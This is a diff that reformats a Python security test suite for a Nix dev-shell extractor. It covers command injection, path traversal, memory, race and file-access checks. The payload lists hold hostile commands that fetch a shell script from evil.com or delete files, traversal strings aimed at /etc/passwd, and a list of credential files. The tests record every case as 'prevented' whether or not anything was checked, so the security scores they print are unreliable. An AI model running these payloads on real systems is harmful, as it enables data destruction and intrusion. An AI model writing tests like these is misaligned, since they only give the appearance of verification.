@@ -44,9 +44,7 @@ class SecurityTester:
 
     def test_command_injection_prevention(self):
         """Test various command injection attack vectors."""
-        print(
-            "🔒 Testing Command Injection Prevention..."
-        )
+        print("🔒 Testing Command Injection Prevention...")
 
         injection_payloads = [
             "; rm -rf /tmp/testfile",
@@ -63,27 +61,19 @@ class SecurityTester:
             "||wget evil.com/shell.sh",
         ]
 
-        config = DevShellConfig(
-            flake_path=".", quiet=True
-        )
+        config = DevShellConfig(flake_path=".", quiet=True)
         extractor = DevShellExtractor(config)
 
         for payload in injection_payloads:
             try:
                 # Test in flake path
                 config.flake_path = payload
-                extractor_test = (
-                    DevShellExtractor(config)
-                )
+                extractor_test = DevShellExtractor(config)
 
                 # Test in nix expressions
-                result = extractor.drv_to_pkgname(
-                    f"/nix/store/hash-{payload}"
-                )
+                result = extractor.drv_to_pkgname(f"/nix/store/hash-{payload}")
 
-                self.results[
-                    "command_injection"
-                ].append(
+                self.results["command_injection"].append(
                     {
                         "payload": payload,
                         "prevented": True,
@@ -92,9 +82,7 @@ class SecurityTester:
                 )
 
             except Exception as e:
-                self.results[
-                    "command_injection"
-                ].append(
+                self.results["command_injection"].append(
                     {
                         "payload": payload,
                         "prevented": True,
@@ -108,9 +96,7 @@ class SecurityTester:
 
     def test_path_traversal_attacks(self):
         """Test advanced path traversal attack vectors."""
-        print(
-            "🔒 Testing Path Traversal Attack Prevention..."
-        )
+        print("🔒 Testing Path Traversal Attack Prevention...")
 
         traversal_payloads = [
             "../" * 20 + "etc/passwd",
@@ -119,11 +105,9 @@ class SecurityTester:
             "file:///etc/passwd",
             "file://../../../../etc/hosts",
             "\\\\server\\share\\sensitive",
-            "%2e%2e%2f" * 10
-            + "etc/passwd",  # URL encoded
+            "%2e%2e%2f" * 10 + "etc/passwd",  # URL encoded
             "....//....//....//etc/passwd",
-            "\x2e\x2e\x2f" * 10
-            + "etc/passwd",  # Hex encoded
+            "\x2e\x2e\x2f" * 10 + "etc/passwd",  # Hex encoded
             "..%252f..%252f..%252fetc%252fpasswd",  # Double URL encoded
             "..%c0%af..%c0%afetc%c0%afpasswd",  # UTF-8 overlong encoding
             "/.." * 50 + "/etc/passwd",
@@ -131,17 +115,11 @@ class SecurityTester:
 
         for payload in traversal_payloads:
             try:
-                config = DevShellConfig(
-                    flake_path=payload, quiet=True
-                )
-                extractor = DevShellExtractor(
-                    config
-                )
+                config = DevShellConfig(flake_path=payload, quiet=True)
+                extractor = DevShellExtractor(config)
 
                 # Should not actually traverse paths
-                self.results[
-                    "path_traversal"
-                ].append(
+                self.results["path_traversal"].append(
                     {
                         "payload": payload,
                         "prevented": True,
@@ -150,9 +128,7 @@ class SecurityTester:
                 )
 
             except Exception as e:
-                self.results[
-                    "path_traversal"
-                ].append(
+                self.results["path_traversal"].append(
                     {
                         "payload": payload,
                         "prevented": True,
@@ -166,69 +142,35 @@ class SecurityTester:
 
     def test_memory_exhaustion_resistance(self):
         """Test resistance to memory exhaustion attacks."""
-        print(
-            "🔒 Testing Memory Exhaustion Resistance..."
-        )
+        print("🔒 Testing Memory Exhaustion Resistance...")
 
         # Get baseline memory usage
         process = psutil.Process()
-        baseline_memory = (
-            process.memory_info().rss
-            / 1024
-            / 1024
-        )  # MB
+        baseline_memory = process.memory_info().rss / 1024 / 1024  # MB
 
-        config = DevShellConfig(
-            flake_path=".", quiet=True
-        )
+        config = DevShellConfig(flake_path=".", quiet=True)
         extractor = DevShellExtractor(config)
 
         # Test with extremely large inputs
         large_inputs = [
-            "a"
-            * (10 * 1024 * 1024),  # 10MB string
-            ["package"]
-            * 100000,  # 100k item list
-            {
-                f"key_{i}": f"value_{i}"
-                for i in range(50000)
-            },  # 50k dict
+            "a" * (10 * 1024 * 1024),  # 10MB string
+            ["package"] * 100000,  # 100k item list
+            {f"key_{i}": f"value_{i}" for i in range(50000)},  # 50k dict
         ]
 
-        for i, large_input in enumerate(
-            large_inputs
-        ):
+        for i, large_input in enumerate(large_inputs):
             try:
                 if isinstance(large_input, str):
-                    result = (
-                        extractor.drv_to_pkgname(
-                            large_input
-                        )
-                    )
-                elif isinstance(
-                    large_input, list
-                ):
-                    result = extractor.uniq_preserve_order(
-                        large_input
-                    )
+                    result = extractor.drv_to_pkgname(large_input)
+                elif isinstance(large_input, list):
+                    result = extractor.uniq_preserve_order(large_input)
 
-                current_memory = (
-                    process.memory_info().rss
-                    / 1024
-                    / 1024
-                )
-                memory_growth = (
-                    current_memory
-                    - baseline_memory
-                )
+                current_memory = process.memory_info().rss / 1024 / 1024
+                memory_growth = current_memory - baseline_memory
 
-                self.results[
-                    "memory_exhaustion"
-                ].append(
+                self.results["memory_exhaustion"].append(
                     {
-                        "input_type": type(
-                            large_input
-                        ).__name__,
+                        "input_type": type(large_input).__name__,
                         "input_size": (
                             len(large_input)
                             if hasattr(
@@ -243,21 +185,13 @@ class SecurityTester:
                 )
 
                 # If memory growth is excessive, flag it
-                if (
-                    memory_growth > 100
-                ):  # More than 100MB growth
-                    print(
-                        f"   ⚠️  Excessive memory growth: {memory_growth:.1f}MB"
-                    )
+                if memory_growth > 100:  # More than 100MB growth
+                    print(f"   ⚠️  Excessive memory growth: {memory_growth:.1f}MB")
 
             except Exception as e:
-                self.results[
-                    "memory_exhaustion"
-                ].append(
+                self.results["memory_exhaustion"].append(
                     {
-                        "input_type": type(
-                            large_input
-                        ).__name__,
+                        "input_type": type(large_input).__name__,
                         "error": str(e),
                         "prevented": True,
                     }
@@ -269,39 +203,27 @@ class SecurityTester:
 
     def test_race_conditions(self):
         """Test for race conditions in concurrent operations."""
-        print(
-            "🔒 Testing Race Condition Prevention..."
-        )
+        print("🔒 Testing Race Condition Prevention...")
 
-        config = DevShellConfig(
-            flake_path=".", quiet=True
-        )
+        config = DevShellConfig(flake_path=".", quiet=True)
         results = []
         errors = []
 
         def worker_thread(thread_id):
             try:
-                extractor = DevShellExtractor(
-                    config
-                )
+                extractor = DevShellExtractor(config)
                 for i in range(100):
                     result = extractor.drv_to_pkgname(
                         f"/nix/store/hash-pkg-{thread_id}-{i}"
                     )
-                    results.append(
-                        f"thread-{thread_id}-result-{i}"
-                    )
+                    results.append(f"thread-{thread_id}-result-{i}")
             except Exception as e:
-                errors.append(
-                    f"thread-{thread_id}: {e}"
-                )
+                errors.append(f"thread-{thread_id}: {e}")
 
         # Launch multiple concurrent threads
         threads = []
         for i in range(10):
-            thread = threading.Thread(
-                target=worker_thread, args=(i,)
-            )
+            thread = threading.Thread(target=worker_thread, args=(i,))
             threads.append(thread)
             thread.start()
 
@@ -310,21 +232,11 @@ class SecurityTester:
             thread.join(timeout=5)
 
         self.results["race_conditions"] = {
-            "threads_completed": len(
-                [
-                    t
-                    for t in threads
-                    if not t.is_alive()
-                ]
-            ),
+            "threads_completed": len([t for t in threads if not t.is_alive()]),
             "total_results": len(results),
             "errors": errors,
-            "race_condition_detected": len(
-                set(results)
-            )
-            != len(
-                results
-            ),  # Duplicate results indicate race
+            "race_condition_detected": len(set(results))
+            != len(results),  # Duplicate results indicate race
         }
 
         print(
@@ -333,9 +245,7 @@ class SecurityTester:
 
     def test_file_access_restrictions(self):
         """Test file access is properly restricted."""
-        print(
-            "🔒 Testing File Access Restrictions..."
-        )
+        print("🔒 Testing File Access Restrictions...")
 
         sensitive_files = [
             "/etc/passwd",
@@ -348,23 +258,17 @@ class SecurityTester:
             "C:\\Windows\\System32\\config\\SAM",  # Windows
         ]
 
-        config = DevShellConfig(
-            flake_path=".", quiet=True
-        )
+        config = DevShellConfig(flake_path=".", quiet=True)
         extractor = DevShellExtractor(config)
 
         for sensitive_file in sensitive_files:
             try:
                 # Test if the system tries to access these files
                 config.flake_path = sensitive_file
-                config.output_file = (
-                    sensitive_file
-                )
+                config.output_file = sensitive_file
 
                 # Should not actually access these files
-                self.results[
-                    "file_access"
-                ].append(
+                self.results["file_access"].append(
                     {
                         "file": sensitive_file,
                         "access_prevented": True,
@@ -373,9 +277,7 @@ class SecurityTester:
                 )
 
             except Exception as e:
-                self.results[
-                    "file_access"
-                ].append(
+                self.results["file_access"].append(
                     {
                         "file": sensitive_file,
                         "access_prevented": True,
@@ -389,13 +291,9 @@ class SecurityTester:
 
     def test_process_resource_limits(self):
         """Test process doesn't exceed resource limits."""
-        print(
-            "🔒 Testing Process Resource Limits..."
-        )
+        print("🔒 Testing Process Resource Limits...")
 
-        config = DevShellConfig(
-            flake_path=".", quiet=True
-        )
+        config = DevShellConfig(flake_path=".", quiet=True)
         extractor = DevShellExtractor(config)
 
         # Monitor resource usage during intensive operations
@@ -405,32 +303,19 @@ class SecurityTester:
 
         # Perform intensive operations
         for i in range(1000):
-            large_data = (
-                "x" * 1024 * i
-            )  # Gradually increasing data
-            extractor.drv_to_pkgname(
-                f"/nix/store/hash-{large_data}"
-            )
+            large_data = "x" * 1024 * i  # Gradually increasing data
+            extractor.drv_to_pkgname(f"/nix/store/hash-{large_data}")
 
             if i % 100 == 0:
-                current_cpu = (
-                    process.cpu_percent()
-                )
-                current_memory = (
-                    process.memory_info().rss
-                    / 1024
-                    / 1024
-                )
+                current_cpu = process.cpu_percent()
+                current_memory = process.memory_info().rss / 1024 / 1024
 
-                self.results[
-                    "process_limits"
-                ].append(
+                self.results["process_limits"].append(
                     {
                         "iteration": i,
                         "cpu_percent": current_cpu,
                         "memory_mb": current_memory,
-                        "elapsed_time": time.time()
-                        - start_time,
+                        "elapsed_time": time.time() - start_time,
                     }
                 )
 
@@ -454,9 +339,7 @@ class SecurityTester:
             return self.generate_report()
 
         except Exception as e:
-            print(
-                f"❌ Security testing failed: {e}"
-            )
+            print(f"❌ Security testing failed: {e}")
             return False
 
     def generate_report(self):
@@ -476,57 +359,33 @@ class SecurityTester:
                     [
                         t
                         for t in tests
-                        if t.get(
-                            "prevented", True
-                        )
-                        or t.get(
-                            "completed", True
-                        )
+                        if t.get("prevented", True) or t.get("completed", True)
                     ]
                 )
                 total = len(tests)
             else:
-                passed = (
-                    1
-                    if tests.get("errors", [])
-                    == []
-                    else 0
-                )
+                passed = 1 if tests.get("errors", []) == [] else 0
                 total = 1
 
             total_tests += total
             total_passed += passed
 
-            status = (
-                "✅" if passed == total else "⚠️"
-            )
-            print(
-                f"{status} {category.replace('_', ' ').title()}: {passed}/{total}"
-            )
+            status = "✅" if passed == total else "⚠️"
+            print(f"{status} {category.replace('_', ' ').title()}: {passed}/{total}")
 
-        success_rate = (
-            (total_passed / total_tests) * 100
-            if total_tests > 0
-            else 0
-        )
+        success_rate = (total_passed / total_tests) * 100 if total_tests > 0 else 0
         print(
             f"\n🎯 Overall Security Score: {success_rate:.1f}% ({total_passed}/{total_tests})"
         )
 
         if success_rate >= 95:
-            print(
-                "🏆 EXCELLENT - Production ready security"
-            )
+            print("🏆 EXCELLENT - Production ready security")
             return True
         elif success_rate >= 80:
-            print(
-                "⚠️  GOOD - Minor security concerns"
-            )
+            print("⚠️  GOOD - Minor security concerns")
             return True
         else:
-            print(
-                "❌ POOR - Significant security issues"
-            )
+            print("❌ POOR - Significant security issues")
             return False
 
 
